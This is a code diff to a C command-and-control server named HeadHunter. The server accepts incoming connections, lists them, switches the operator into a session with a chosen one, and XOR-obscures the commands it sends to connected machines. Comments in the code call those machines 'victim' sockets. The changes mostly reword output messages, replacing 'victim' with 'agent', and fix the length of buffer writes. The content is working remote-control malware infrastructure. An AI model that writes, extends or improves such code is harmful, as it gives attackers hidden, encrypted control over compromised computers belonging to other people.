@@ -19,25 +19,20 @@ int server_control_session()
     fflush(NULL);
     while ((n = read(a.src, buffer, MAXBUF)) > 0) {
         if (strcmp(buffer, "help\n") == 0 || strcmp(buffer, "help\n\n") == 0) {
-            printf("\nCommands:\n");
-            printf(">help                   |  List all available commands\n");
-            printf(">show connections       |  List active connections\n");
-            printf(">use <connection id>    |  Switch session to specified "
-                   "connection by id\n");
-            printf(">exit                   |  Close headhunter\n");
-            printf("***********************************************************"
-                   "************\n\n");
-        } else if (strcmp(buffer, "show connections\n") == 0 ||
-                   strcmp(buffer, "list connections\n\n") == 0) {
-            printf("\nCurrent connections:\nID  |  "
-                   "Address\n--------------------------\n");
-            for (int i = 0; i < max_clients; i++) {
-                if (client_socket[i] == 0) {
-                    continue;
-                } // Continue just in case there is a random NULL socket
-                printf("%3d |  %s\n", i + 1, get_socket_addr(client_socket[i]));
+
+            printf("\nHeadHunter Control Server Commands:\n");
+            printf("> help                   |  List all available commands\n");
+            printf("> show sessions          |  List active connections\n");
+            printf("> use <session id>       |  Switch session to specified connection by id\n");
+            printf("> exit                   |  Close headhunter\n\n");
+        } else if (strcmp(buffer, "show sessions\n") == 0 || strcmp(buffer, "list connections\n\n") == 0 ) {
+            printf("\nID          Address\n--------------------------\n");
+            for (int i = 0; i < max_clients; i++){
+                if (client_socket[i] == 0){ continue; }  // Continue just in case there is a random NULL socket
+                printf("%d           %s\n", i + 1, get_socket_addr(client_socket[i]));
+
             }
-            printf("--------------------------\n\n");
+	    printf("\n");
         } else if (str_starts_with(buffer, "use") == 1) {
             selected_id = 0;
 
@@ -52,9 +47,10 @@ int server_control_session()
             if (selected_id > victim_count || selected_id < 0) {
                 printf("Invalid id!\n\n");
             } else {
-                printf("Entering victim control session with VID: %d...\n",
-                       selected_id);
-                printf("Type \"!exit\" to background victim control session\n");
+
+                printf("[+] Entering agent control session with session ID: %d...\n", selected_id);
+                printf("Type \"exit\" to background agent control session\n");
+
                 selected_id += 3;
                 return selected_id;
             }
@@ -84,9 +80,9 @@ void* Socket_Reader()
     // Intercept incoming data from the current victim socket
     char buffer[MAXBUF];
     int n;
-    read(a.dest, buffer, 17);
-    char* xorhello = XOR(buffer, key, 17, keylen);
-    write(STDOUT_FILENO, xorhello, 17);
+    read(a.dest, buffer, 18);
+    char* xorhello = XOR(buffer, key, 18, keylen);
+    write(STDOUT_FILENO, xorhello, 18);
 
     fflush(NULL);
     while (a.kill == 0 && (n = read(a.dest, buffer, MAXBUF)) > 0) {
@@ -123,20 +119,17 @@ void* Socket_Writer()
                // contents are above 0. a.src is passed the stdin fd on line 122
     {
 
-        if (strcmp(newline_terminator(buffer), "!exit\n") == 0 ||
-            strcmp(newline_terminator(buffer), "!exit\n\n") ==
-                0) { // Find a way
+        if (strcmp(newline_terminator(buffer), "exit\n") == 0 || strcmp(newline_terminator(buffer), "!exit\n\n") == 0) { //Find a way
+
             printf("Exiting session...\n");
             a.kill = 1;
             return NULL;
         } else {
+	
+	          char* xorbuffer = XOR(buffer, key, n, keylen);
 
-            char* xorbuffer = XOR(buffer, key, MAXBUF, keylen);
+            write(a.dest, xorbuffer, n); // writes to victim file descriptor. clientfd is passed to a.dest on line 12
 
-            write(a.dest,
-                  xorbuffer,
-                  MAXBUF); // writes to victim file descriptor. clientfd is
-                           // passed to a.dest on line 12
         }
     }
 
@@ -208,10 +201,11 @@ void* Acceptor()
                     if (client_socket[i] == 0) {
                         client_socket[i] = new_socket;
                         victim_count++;
-                        printf("\nConnection received with %s\n",
-                               get_socket_addr(new_socket));
-                        printf("Press enter to or type a command to resume "
-                               "previous session\n\n");
+
+                        printf("\nConnection received with %s\n", get_socket_addr(new_socket));
+                        printf("Press enter or type a command to resume previous session\n\n");
+
+
 
                         break;
                     }
